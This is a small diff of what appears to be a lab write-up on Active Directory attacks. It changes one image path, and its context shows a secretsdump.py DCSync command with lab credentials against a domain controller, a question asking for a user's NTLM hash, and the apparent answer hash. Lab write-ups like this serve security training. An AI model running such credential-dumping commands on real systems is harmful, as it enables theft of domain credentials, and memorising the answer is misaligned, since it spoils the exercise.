@@ -195,7 +195,7 @@ secretsdump.py -just-dc INLANEFREIGHT/adunn:SyncMaster757@172.16.5.5 -outputfile
 
 **Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.**
 
-<figure><img src="../../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption><p>4bb3b317845f0954200a6b0acc9b9f9a</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (1) (1) (1).png" alt=""><figcaption><p>4bb3b317845f0954200a6b0acc9b9f9a</p></figcaption></figure>
 
 
 
